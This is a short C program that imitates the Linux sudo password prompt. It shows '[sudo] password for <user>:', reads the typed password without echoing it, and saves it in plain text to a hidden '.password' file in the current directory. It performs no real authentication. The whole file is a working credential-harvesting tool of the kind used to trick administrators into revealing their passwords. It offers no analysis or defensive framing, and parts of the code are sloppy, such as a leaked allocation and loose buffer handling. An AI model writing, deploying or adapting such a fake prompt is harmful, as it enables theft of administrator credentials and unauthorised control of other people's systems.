#include <stdlib.h>
#include <termios.h>
#include <stdio.h>
#include <unistd.h>


static struct termios old, current;

/* Initialize new terminal i/o settings */

void initTermios(int echo) 
{
  tcgetattr(0, &old); /* grab old terminal i/o settings */
  current = old; /* make new settings same as old settings */
  current.c_lflag &= ~ICANON; /* disable buffered i/o */

  if (echo) {
      current.c_lflag |= ECHO; /* set echo mode */
  }
  else {
      current.c_lflag &= ~ECHO; /* set no echo mode */
  }
  tcsetattr(0, TCSANOW, &current); /* use these new terminal i/o settings now */
}

/* Restore old terminal i/o settings */
void resetTermios(void) 
{
  tcsetattr(0, TCSANOW, &old);
}

/* Read 1 character - echo defines echo mode */

char getch_(int echo) 
{
  char ch;
  initTermios(echo);
  ch = getchar();
  resetTermios();
  return ch;
}

/* Read 1 character without echo */
char getch(void) 
{
  return getch_(0);
}


/*Exit if admin presses enter and print the sudo message*/
void exit_if_admin_presses_enter()
{
  printf("sudo: password is required: \n");
  exit(0);
}

void main(/*char* new_pass*/)
{
  FILE* fp;
  char* password;
  //char* new_pass;
  char* username;
  char ch;
  
  int i = 0, password_length = 1;
	
  
  //printf("Length of new_pass is: %d", (int)strlen(new_pass));
  username = (char *) malloc(10 * sizeof(char));
  username = getlogin();

  printf("[sudo] password for %s: ", username);

  ch = getch();
  
  password = (char*) malloc( sizeof(char) );
  
  if(password == NULL) exit_if_admin_presses_enter();

  
  if(ch == 0x0A)
  {
    printf("\nsudo: a password is required\n");
    exit(0);
  } 

  password[0] = ch;

  while(ch != 0x0A)
  {
    password[i] = ch;
    i++;
    ch = getch();
    
    password = (char*) realloc( (password), (password_length + 1) * sizeof(char) );

    if(password == NULL) exit(0); //Exit if the admin presses Enter

    password_length++;
  }
	
  printf("\n");
  
  fp = fopen(".password", "w");
	
  for(i = 0;i < password_length;i++)
  {
    fprintf(fp, "%c", password[i]);
  } 
  
  fclose(fp);
}